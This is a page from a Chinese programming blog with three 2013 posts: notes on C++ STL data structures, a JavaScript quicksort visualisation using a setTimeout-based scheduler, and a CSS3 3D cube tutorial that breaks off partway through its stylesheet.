<!doctype html>



  


<html class="theme-next mist use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="计算机 比特币 互联网金融 IFWallet" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta name="description" content="区块链爱好者，互联网从业者">
<meta name="keywords" content="bibodeng, blockchain, bitcoin, bitcoin cash, life, programmer">
<meta property="og:type" content="website">
<meta property="og:title" content="bibodeng">
<meta property="og:url" content="https://bibodeng.github.io/page/8/index.html">
<meta property="og:site_name" content="bibodeng">
<meta property="og:description" content="区块链爱好者，互联网从业者">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="bibodeng">
<meta name="twitter:description" content="区块链爱好者，互联网从业者">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Mist',
    sidebar: {"position":"right","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> bibodeng </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-right 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">bibodeng</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">Think By My Mind</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/25/梳理常见数据结构/" itemprop="url">
                  梳理常见数据结构
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-25T15:38:53+08:00" content="2013-10-25">
              2013-10-25
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/25/梳理常见数据结构/" class="leancloud_visitors" data-flag-title="梳理常见数据结构">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#梳理常见数据结构</p>
<p>by bibodeng 2013-10-25</p>
<h2 id="算法数据囧"><a href="#算法数据囧" class="headerlink" title="算法数据囧"></a>算法数据囧</h2><p>计算机最最重要的是它的硬件能够快速运算，它的软件具有抽象事物的能力。其中算法，是建立在数据结构上的，而对事物的抽象，则是建立在数据结构上的。近期笔试面试中也常考，虽然尤其是对后台的同学来讲，这方面要求会高一点。但是作为计算机学院的学生，很有必要理解一些经典的数据结构，它的最大特征，注意事项，已经常用方法。</p>
<p>我有一次懵了，居然忘了 <code>vector</code> 和 <code>list</code>之间的严格区别，居然闹了笑话。我是一只计算囧。一些程序员追求流行技术的花样，搞得很多框架，模式，有一部分害怕数据，害怕算法，那么终究搞计算机都不是长久之计。</p>
<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>主要摘录的数据结构有： vector, list, queue, heap, stack, map, set, hashtable。尤其是stack， hashtable，经常出现在笔试题中。</p>
<h3 id="vector-容器"><a href="#vector-容器" class="headerlink" title="vector 容器"></a>vector 容器</h3><pre><code>&gt; * 描述：数组的高级版本，可扩充空间，支持随机存取访问，是一段连续线性的空间。
&gt; * 策略：其实是，当该数组内存不够时，新malloc一块2倍大的内存，将内容复制过去
&gt; * 常见方法： 使用iterator遍历 vector&lt;int&gt;::iterator beg = iv.begin(); *beg 取得内容。
&gt;  arr.push_back(1) 加入， arr.erase(ite) 进行删除
&gt; * 注意： 内存重新复制后迭代子是消失了的
&gt; * 优点： 快速访问，动态扩展
&gt; * 缺点： 内存复制，耗费时间
</code></pre><h3 id="list-链表"><a href="#list-链表" class="headerlink" title="list 链表"></a>list 链表</h3><p><img src="http://daoluan.net/blog/wp-content/uploads/2012/10/list_node.jpg" alt="队列节点"></p>
<pre><code>&gt; * 描述：用指针将前后节点链接起来，指针个数多样，灵活进行插入删除
&gt; * 策略：one by one, hand in hand, 需要一个头指针，由stl维护
&gt; * 常见方法： 迭代器声明方式同vector，lis.push_back(1) 加入， arr.erase(ite) 进行删除
&gt; * 优点： 添加和删除高效
&gt; * 缺点： 不能随机访问，要find()需要遍历，这是硬伤
</code></pre><h3 id="deque-双端队列"><a href="#deque-双端队列" class="headerlink" title="deque 双端队列"></a>deque 双端队列</h3><p><img src="http://daoluan.net/blog/wp-content/uploads/2012/10/deque_in_real.jpg" alt="deque">    </p>
<pre><code>&gt; * 描述：较陌生，它是“分段存储，整体维护”， stack的和queue的母版，看起来复杂好多
&gt; * 策略： 使用map表来进行管理缓存，容易扩展
&gt; * 常见方法： 可以模拟‘随机’访问， de.push_back(), de[i]，*ite访问元素。
&gt; * 迭代器： 见下面的代码
&gt; * 注意： algorithm sort不支持这个迭代器，需要把元素都拿出来放到vector中遍历再放回deque
&gt; * 优点： 强大
&gt; * 缺点： 迭代器较复杂
</code></pre><p>迭代器代码,结合上图进行理解</p>
<pre><code>// 这些是内部维护的，我们不用管
typedef T** map_pointer;    // T是template类型
T* cur;        //指向当前元素
T* first;    //指向缓冲区头
T* last;    //指向缓冲区尾巴
map_pointer node;    //二级指针，指向缓冲区地址表中的位置
</code></pre><h3 id="stack-栈"><a href="#stack-栈" class="headerlink" title="stack 栈"></a>stack 栈</h3><pre><code>&gt; * 描述： 后进先出，一条只容一个人通过的死胡同
&gt; * 策略： 使用deque来实现，限制其只能从一端的尾部进行操作（添加和弹出）
&gt; * 常见方法： push 入栈， pop 出栈，top 顶部
&gt; * 迭代器： 无 不允许遍历
&gt; * 注意： 可选用底层容器实现stack 如 stack&lt;int,list&lt;int&gt;&gt; is;
</code></pre><h3 id="queue-队列"><a href="#queue-队列" class="headerlink" title="queue 队列"></a>queue 队列</h3><pre><code>&gt; * 描述： 一条水管，先进先出
&gt; * 策略： 从尾部添加，从首部弹出
&gt; * 常见方法： push 入队， pop 出队，que.front() 获得头部，que.back()获得尾部
&gt; * 迭代器： 无 不允许遍历
</code></pre><h3 id="heap-堆"><a href="#heap-堆" class="headerlink" title="heap 堆"></a>heap 堆</h3><p>其实它是一种二叉树，一种确保根节点比子节点大的二叉树。我们的堆排序就是利用了这个特性，从而每次从根取出最小或者最大的，从而完成了排序。</p>
<pre><code>&gt; * 描述： 完全二叉树（若二叉树高h，除过最底层h层，其他层1~h-1都是满的；并且最底层从左到右不能有空隙），可以写成数组形式
&gt; * 策略： 保证根是最大或最小的，从而保证堆的性质
&gt; * 常见方法： 上溯：某节点与父节点比较，如果其键值比父节点大，即交换父子节点。从下往上重复； 下溯：与上溯方向相反
&gt; * 迭代器： vector实现max_heap,则为vector迭代器
&gt; * 注意： 可以用数组进行存储，有节点i，那么2i即为其左子结点，2i+1即为其右子结点（正是因为其是满二叉树）
堆带有二叉树的递归性质，故而子堆也具有堆的性质。
</code></pre><h3 id="map-映射"><a href="#map-映射" class="headerlink" title="map 映射"></a>map 映射</h3><p><img src="http://upload.wikimedia.org/wikipedia/commons/thumb/6/66/Red-black_tree_example.svg/450px-Red-black_tree_example.svg.png" alt="红黑树"></p>
<pre><code>&gt; * 描述： 一个键值对应一个实值的映射，不允许键值上的重复，内部是按键值来进行排序存储的，其中键值不允许被更改。
&gt; * 策略： 由非线性空间来存储的， 由RB_TREE（非强平衡树）实现
&gt; * 常见方法： map&lt;int,int&gt; im; im.insert(pair&lt;int,int&gt;(7,700)); 插入对。 遍历
&gt; * 迭代器： map&lt;int,int&gt;::iterator ite； ite-&gt;first, ite-&gt;second 进行访问。
</code></pre><h3 id="set-集合"><a href="#set-集合" class="headerlink" title="set 集合"></a>set 集合</h3><pre><code>&gt; * 描述：顾名思义，不允许重复，底层是由强大的RB_TREE实现的，set中键值就是实值，实值就是键值
&gt; * 策略： 由非线性空间来存储的
&gt; * 常见方法： insert()插入元素， ite.begin(), ite.end() 
&gt; * 迭代器： set&lt;int&gt;::iterator ite; *ite可访问。
&gt; * 注意：不允许更新值
</code></pre><p>对于红黑树，还不算了解，需要找时间彻底地理解map和set的底层。</p>
<h3 id="hash-table-哈希表"><a href="#hash-table-哈希表" class="headerlink" title="hash_table 哈希表"></a>hash_table 哈希表</h3><p>这是笔试面试中考得最多的了，并且一些关于大数据处理问题，需要hash_table来处理，用于解决快速找到所存储的值。没错，数据库中大量应用了hash_table。</p>
<pre><code>&gt; * 描述： 通过对值进行散列，对应到一个连续空间中
&gt; * 策略： 通过计算散列到线性空间，高效查找， 键值对存储。
&gt; * 常见方法： 用hash_table 实现了 hash_set 和 hash_map,故而操作同上
&gt; * 迭代器： STL暂无
&gt; * 注意： 容易发生碰撞，碰撞后往往要线性探测/二次探测/再散列 ，或者是带着一条链表（开链法）。
</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>思愿同学写的 <a href="http://daoluan.net/blog/confidential-stl/" target="_blank" rel="noopener">STL私房菜</a> 大部分图片从这里来，里面的讲解也深入很多。作为一个计算机学生，的确应该对这些基本的数据结构都熟悉，对他们的优点缺点都，适合干啥，都能明确回答，除此之外用这些数据结构来实现点东西，加深印象，我倒是有点重返C++的冲动啊。</p>
<hr>
<p>end</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/25/用js实现快排加演示-js排程初探/" itemprop="url">
                  用js实现快排加演示-js排程初探
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-25T08:27:58+08:00" content="2013-10-25">
              2013-10-25
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/25/用js实现快排加演示-js排程初探/" class="leancloud_visitors" data-flag-title="用js实现快排加演示-js排程初探">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用js实现快排加演示"><a href="#用js实现快排加演示" class="headerlink" title="用js实现快排加演示"></a>用js实现快排加演示</h1><p>by bibodeng 2013-10-24</p>
<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>有很多时候，我们都是需要重新做一个轮子，才知道轮子究竟是什么样子的，然后就可以在下一次碰到这种情况时能够立马写出来，并且能写得很好。本来我打算写一个快排，然后在页面中进行演示，我知道已经有很牛的人实现过了，但是我做这个的时候，遇到了一些困难，使我想起了前段时间想要写某个锁机制队列的时候，后来发现已经有一个同事已经实现了。</p>
<h2 id="实现快排"><a href="#实现快排" class="headerlink" title="实现快排"></a>实现快排</h2><p>先来写个快速排序吧。</p>
<pre><code>var qsort =  function(arr, p, q)
{
    var x;
    if (p &lt; q)    // 需要排序的元素个数不为0
    {
        x = partition(arr, p, q);    // 对数组进行partion处理
        qsort(arr, p, x-1);            // x之前部分  x是该轮确定位置的元素
        qsort(arr, x+1, q);            // 2次递归
    }
};

var partition = function(arr, p, q)
{

    var tmp = 0,
        i     = p,
        j     = q + 1,
        base = arr[p];    // 首元素作为基准

    // 将数组分成两部分，大于base的，小于base的

    while (1)
    {

        while (arr[++i] &lt;= base &amp;&amp; i &lt; q)；

        while (arr[--j] &gt; base);        // 向中间逼近

        if (i &gt;= j)    // 交叉了
        {
            break;
        }
        // 否则就交互两个数，正好比base大的和比base小的换了一下

        // swap(arr[i], arr[j]);
        tmp = arr[j];
        arr[j] = arr[i];
        arr[i] = tmp;
    }
    //     交互基准值和中值

    arr[p] = arr[j];    // 将中间元素放到首部
    arr[j] = base;        // 将基准元素放到中间
    return j;        // 返回这个位置
};
</code></pre><p>没什么特别的，几乎和C++的一模一样，其中swap在js下，因为不是传入参数不是引用类型，故而不起作用，故而直接引入tmp变量进行交换。下面是调用部分：</p>
<pre><code>$.(function(){
    // 进行测试

    var myArr = [],
        total = 50；

    for (var i = 0; i &lt; total; i++)
    {
        myArr.push(parseInt((Math.random() * 450)));    // 0 - 450
    }

    // 绘制方格
    qsort(myArr, 0, myArr.length-1); 
});
</code></pre><p>为了能够体现出排序的可视化效果，我打算绘制一些小方格排列在一起，就像下面这样：</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/6666f6b0ea50298df61bfe5cad57efce2013102411275015768.png" alt="排序可视化"></p>
<p>实现的代码并不麻烦，在ready中加入绘制方格的代码：</p>
<pre><code>// 绘制方格
var str = &apos;&apos;;
for (var j = 0; j &lt; total; j++)
{
    str += &quot;&lt;li class=&apos;normal&apos; style=&apos;height:&quot;+myArr[j]+&quot;px;&apos;&gt;&lt;/li&gt;&quot;;    // 添加元素
}
$partent.html(str);
var $list = $(&apos;#sort_list&apos;).find(&apos;li&apos;);
</code></pre><p>其html代码，主要是提供容器，还有CSS样式。</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;style type=&quot;text/css&quot;&gt;
.normal{
    background-color: #222;
}

.base{
    background-color: #f22;
}

.selected{
    background-color: #22f;
}

#main{
    width: 1000px;
    height: 600px;
    margin: 10px auto;
    -webkit-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    transform: rotate(180deg);
}

#sort_list li{
    float: left;
    width: 10px;
    margin: 1px;
    list-style: none;
}

&lt;/style&gt;
&lt;title&gt;快速排序&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div id=&quot;main&quot;&gt;
        &lt;ul id=&quot;sort_list&quot;&gt;
        &lt;/ul&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>接下来就要实现排序过程中的动态效果了，这是一个很麻烦的事情。初步实现的例子是<a href="">这样的</a>。尽管我试着在<code>partition</code>每一步中进行延时，但是排序算法始终太快了，而使用setTimeout的方法进行异步延时，得到的动画效果将和排序结果不兼容的。修改后的代码，增大了递归的时间间隔，但是夹逼的效果闪烁太快了，没有流动的动画效果。这其实是因为代码执行和DOM元素操作不同步引起的。</p>
<pre><code>var qsort =  function(arr, p, q)
{
    var x;
    if (p &lt; q)    // 需要排序的元素个数不为0
    {
        x = partition(arr, p, q);    // 对数组进行partion处理

        setTimeout(function(){
            qsort(arr, p, x-1);        // x之前部分  x是该轮确定位置的元素
        }, 1000);

        setTimeout(function(){
            qsort(arr, x+1, q);        // 2次递归
        }, 2000);

    }

    console.log(&apos;after sort&apos;, arr);
};
</code></pre><p>并且setTimeout这东西，在循环下，是很耗费内存的，会导致页面奔溃，并且它之内将逻辑包围在一个函数参数里面，不太好。当把for循环换成setInterval调用时，元素操作效果倒是流畅了，但是排序结果却不正确了。原因是后续代码已经开始运行了。</p>
<h2 id="异步的麻烦与解决办法"><a href="#异步的麻烦与解决办法" class="headerlink" title="异步的麻烦与解决办法"></a>异步的麻烦与解决办法</h2><p>异步的麻烦，是真麻烦。我思考了一下，将排序算法和DOM操作混在一起是很野蛮的做法，没有做到数据加工和体现的分离。而当前状态又需要重绘，才能体现出其动态效果，但是重绘的代价也太大了，左思右想，没有想到好的解决办法，于是找到陈皓提到的日本程序员写的<a href="http://coolshell.cn/articles/3933.html" target="_blank" rel="noopener">排序可视化</a>，太强大了，效果也是一级棒，不过要细细剖析源码才知道它是如何实现的，这个改天再一探究竟，今天我要隆重介绍一下一个相当优雅的排程小程序，个人觉得写得相当优雅。</p>
<p>我们做很多编程工作时，往往想要同步（这里的同步指的是确定顺序，而不是不确定），例如在进行ajax请求时，回调结果往往要等一段时间才能返回，但是我们的程序的<code>return</code>却不知道要从哪里返回，如果在回调的外面，则等不到结果就返回了，如果在回调函数里面，则又返回不到正确的地方，这个时候就很有必要同步了。而一个排程的程序，对各个操作进行同步互斥，则可以让它们乖乖一个接一个按顺序执行，这就好比操作系统里面对资源的锁。具体可以参看<a href="http://myunlessor.me/" target="_blank" rel="noopener">myunlessor写的排程策略详解</a>。直接上代码吧：</p>
<pre><code>// 排程策略 - 全局定义
var schedule = (function (self) {
  var paused = false, // 标记状态
      queue  = [];     // 队列

  // 入队
  self.join = function (fn, params) {
    params = params || {};
    var args = [].concat(params.args);

    queue.push(function (_) {
      _.pause();
      setTimeout(function () {
        fn.apply(params.context || null, args);
        _.resume();
      }, params.delay || 1);
    });

    return exec();
  };

  self.pause = function () {
    paused = true;  // 忙碌
    return this;
  };

  // ready and call next
  self.resume = function () {
    paused = false; // 空闲
    setTimeout(exec, 1);
    return this;
  };

  function exec() {
    if (!paused &amp;&amp; queue.length) {
      queue.shift()(self);  // 出队
      if (!paused) self.resume();
    }
    return self;
  }

  return self;
}(schedule || {}));    // 立即执行，self就是schedule本身
</code></pre><p>我对着这个程序看了十来分钟，越看越有味道，从这个程序中可以看到javascript的很多good part,暂时没有看到缺陷，例如[]，用成了活生生的队列，使用push和shift进行入队出队操作。还有闭包，直接返回一个self，本身参数传的是schedule，而schedule本身是刚刚定义的，需要赋值的，这一切看起来多么地神奇，还有返回this，强大的链式调用，有木有，额有点跑题了。下面我们就应用到我们的排序中：</p>
<pre><code>var qsort =  function(arr, p, q)
{
    var x;
    if (p &lt; q)    // 需要排序的元素个数不为0
    {
        x = partition(arr, p, q);    // 对数组进行partion处理

        schedule
        .join(qsort,{
            delay: 100,
            args: [arr, p, x-1]
        })
        .join(qsort, {
            delay: 100,
            args: [arr, x+1, q]
        });
    }
};
</code></pre><p>一切都相当优雅。当我打开浏览器测试时，发现，有了排程，而不是死板的setTimeout，动画变得流畅了很多。接下来的目标是接着优化<code>partition</code>里面的代码，使得这个过程也看起来很流畅。</p>
<pre><code>var partition = function(arr, p, q)
{

    var tmp = 0,
        i     = p,
        j     = q + 1,
        base = arr[p];    // 首元素作为基准

    $list.attr(&apos;class&apos;, &apos;normal&apos;);
    schedule
    .join(showBase, {
        delay: 0,
        args: [p]
    });

    while (1)
    {

        while (arr[++i] &lt;= base &amp;&amp; i &lt; q)
        {
            ;// 只要是小于base且没到结尾就一直前进
            schedule.
            join(moveSelectedRight,{
                delay: 50,
                args : [i]
            });
        }

        while (arr[--j] &gt; base){
            schedule.
            join(moveSelectedRight,{
                delay: 50,
                args : [j]
            });
        }

        if (i &gt;= j)    // 交叉了
        {
            break;
        }
        // 否则就交互两个数，正好比base大的和比base小的换了一下

        tmp = arr[j];
        arr[j] = arr[i];
        arr[i] = tmp;

        // 交换两元素的位置，这里耍了点小聪明，用高度代替
        schedule
        .join(exchangeHeight,{
            delay: 50,
            args: [$list.get(i), $list.get(j)]
        });
    }


    //     交互基准值和中值

    arr[p] = arr[j];    // 将中间元素放到首部
    arr[j] = base;        // 将基准元素放到中间

    schedule
    .join(exchangeHeight,{
        delay: 50,
        args: [$list.get(p), $list.get(j)]
    });

    $list.attr(&apos;class&apos;, &apos;normal&apos;);
    return j;        // 返回这个位置
};

// 将标志右移 只改颜色
var moveSelectedRight = function(i){
    $(&apos;.selected&apos;).attr(&apos;class&apos;, &apos;normal&apos;);
    $($list.get(i)).attr(&apos;class&apos;, &apos;selected&apos;);
};

// 将标志左移
var moveSelectedLeft = function(j){
    $(&apos;.selected&apos;).attr(&apos;class&apos;, &apos;normal&apos;);
    $($list.get(j)).attr(&apos;class&apos;, &apos;selected&apos;);
};

var showBase = function(base){
    $(&apos;.base&apos;).attr(&apos;class&apos;, &apos;normal&apos;);
    $($list.get(base)).attr(&apos;class&apos;, &apos;base&apos;);        // 将base染色
};

// 交换两个元素的位置 A 前 B 后
var exchange = function(elemA, elemB){
    var m = $(elemA).next(),
        n = $(elemB).prev();

    console.log(&apos;交换&apos;);
    setTimeout(function(){
        $(elemB).insertBefore(m);
        $(elemA).insertAfter(n);
    }, 50);

};

// 只交换两者的高度
var exchangeHeight = function(elemA, elemB)
{
    var tmp = parseInt($(elemA).css(&apos;height&apos;));

    $(elemA).css(&apos;height&apos;, $(elemB).css(&apos;height&apos;));
    $(elemB).css(&apos;height&apos;, tmp+&apos;px&apos;);
};    
</code></pre><p>最后的效果，可以看<a href="http://bibodeng.com/bibodeng/js-algorithms/qsort/index.html" target="_blank" rel="noopener">这里</a>。但是显然这种DOM操作和算法混在一起的日子是不长久的，鬼群里面有人建议使用<a href="http://d3js.org/" title="jquery-d3插件" target="_blank" rel="noopener">D3一个数据DOM体现的插件</a>，有待继续探索。勇敢的骚年，快去创造奇迹！！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://myunlessor.me/blog/2013/06/04/strategy-for-scheduling-javascript-asynchronous-code/" target="_blank" rel="noopener">js排程策略</a></p>
<p><a href="http://coolshell.cn/articles/3933.html" target="_blank" rel="noopener">可视化排序</a></p>
<p><a href="http://d3js.org/" target="_blank" rel="noopener">jQuery D3</a></p>
<hr>
<p>end</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2013/10/23/CSS3 3D六面体效果/" itemprop="url">
                  CSS3 3D六面体效果
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2013-10-23T17:55:01+08:00" content="2013-10-23">
              2013-10-23
            </time>
          </span>

          

          
            
          

          
	
          
          
             <span id="/2013/10/23/CSS3 3D六面体效果/" class="leancloud_visitors" data-flag-title="CSS3 3D六面体效果">
               &nbsp; | &nbsp;
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               <span class="post-meta-item-text">阅读次数 </span>
               <span class="leancloud-visitors-count"></span>
              </span>
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="CSS-3D效果"><a href="#CSS-3D效果" class="headerlink" title="CSS 3D效果"></a>CSS 3D效果</h1><p>by bibodeng 2013-10-23</p>
<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>无意之中看到<a href="http://beiyuu.com/" target="_blank" rel="noopener">beiyuu</a>写的CSS3动画详解，而我之前没有怎么系统学习过CSS3和HTML5，故而对其炫酷的效果非常动心，并且觉得这个技术在一些地方肯定非常棒。他的讲解例子很丰富，但是我还是花了一些功夫去理解。轻松获得的东西，也容易轻松失去，如果其中过程很难忘，那么的确可以学到一些东西。而这个折腾的过程，我也动手亲自实践了一下，一起来吧！</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/8d3daa4bfcfccc75819d06cf1f79bce42013102307565821497.png" alt="成为最强的人"></p>
<p>一直觉得很自卑，想要成为一个很强的人 : P</p>
<h2 id="CSS3-3D"><a href="#CSS3-3D" class="headerlink" title="CSS3 3D"></a>CSS3 3D</h2><p>如果突然给个例子你，很可能会消磨掉你的耐性，一切应当在愉悦的氛围下学习，但是也要留下深刻的印象，其基础是理解，这样很容易就知道如何写一个3D的东西了，将来也可以写更加复杂的效果（如果你数学好的话）。</p>
<h3 id="3D坐标系"><a href="#3D坐标系" class="headerlink" title="3D坐标系"></a>3D坐标系</h3><p>计算机技术源于数学，而3D坐标系，是3D空间的基础。2D空间中，容易理解，就是一个十字，横向为x轴，纵向为y轴。如下：</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/282308e18cf25d10bf245c2d511a642d2013102308173126290.png" alt="二维坐标轴"></p>
<p>三维的坐标轴稍有不同，举起你的右手，手心对着你的脸，大拇指头就是x, 中指是z， 而食指是y轴。如下图所示：</p>
<p><img src="http://www.bibodeng.com/content/plugins/kl_album/upload/201310/6b2ef4260a2a5c0d2e4525830869303b2013102309193132740.png" alt="三维坐标轴"></p>
<p>下面将会理解怎么布局3维的东西，这个图对于理解rotate（旋转）， transform（位移）都将有帮助。也可以看看这里的<a href="http://desandro.github.io/3dtransforms/examples/cube-01-steps.html" target="_blank" rel="noopener">分步过程</a>,分为以下步骤：</p>
<ol>
<li>形成平面叠加</li>
<li>平面旋转，上下左右，前后，但是还有一些重叠在一起</li>
<li>对平面进行位移，形成3维视觉效果</li>
<li>整体旋转3D物体</li>
</ol>
<h3 id="将元素转化为3D空间"><a href="#将元素转化为3D空间" class="headerlink" title="将元素转化为3D空间"></a>将元素转化为3D空间</h3><p>假设我们正在做一个骰子一样的六面体，我们希望它的六个面能够像坐标中的那个立方体一样。首先写出如下的html代码，构建出基本元素。</p>
<pre><code>&lt;div id=&quot;cube-con&quot;&gt; &lt;!-- 主容器 --&gt;
    &lt;div id=&quot;cube&quot;&gt;
        &lt;figure class=&quot;front&quot;&gt;1&lt;/figure&gt;
        &lt;figure class=&quot;back&quot;&gt;2&lt;/figure&gt;
        &lt;figure class=&quot;right&quot;&gt;3&lt;/figure&gt;
        &lt;figure class=&quot;left&quot;&gt;4&lt;/figure&gt;
        &lt;figure class=&quot;top&quot;&gt;5&lt;/figure&gt;
        &lt;figure class=&quot;bottom&quot;&gt;6&lt;/figure&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;cube_btns&quot;&gt;    &lt;!-- 用于控制翻转的按钮,供js调用 --&gt;
    &lt;input type=&quot;button&quot; value=&quot;前&quot; id=&quot;cube_btn1&quot;&gt;
    &lt;input type=&quot;button&quot; value=&quot;后&quot; id=&quot;cube_btn2&quot;&gt;
    &lt;input type=&quot;button&quot; value=&quot;右&quot; id=&quot;cube_btn3&quot;&gt;
    &lt;input type=&quot;button&quot; value=&quot;左&quot; id=&quot;cube_btn4&quot;&gt;
    &lt;input type=&quot;button&quot; value=&quot;上&quot; id=&quot;cube_btn5&quot;&gt;
    &lt;input type=&quot;button&quot; value=&quot;下&quot; id=&quot;cube_btn6&quot;&gt;
&lt;/div&gt;
</code></pre><p>下面要写CSS3代码，整出3D效果：</p>
<pre><code>#cube-con {
    width: 200px;
    height: 200px;
    position: relative;
    margin: 40px auto 40px;
    -webkit-perspective:1000px;    /*从多远的距离进行观察，值越大，立体部分拉升越小*/
       -moz-perspective:1000px;
         -o-perspective:1000px;
            perspective:1000px;
}
#cube {
    width: 100%;
    height: 100%;
    position: absolute;
    -webkit-transform-style:preserve-3d; /*转换成3D空间！*/
       -moz-transform-style:preserve-3d;
         -o-transform-style:preserve-3d;
            transform-style:preserve-3d;
    -webkit-transition:-webkit-transform 1s;
       -moz-transition:-moz-transform 1s;
         -o-transition:-o-transform 1s;
            transition:transform 1s;
    -webkit-transform:translateZ( -100px );
       -moz-transform:translateZ( -100px );
         -o-transform:translateZ( -100px );
            transform:translateZ( -100px );
}

#cube figure {
    width:196px;
    height:196px;
    display:block;
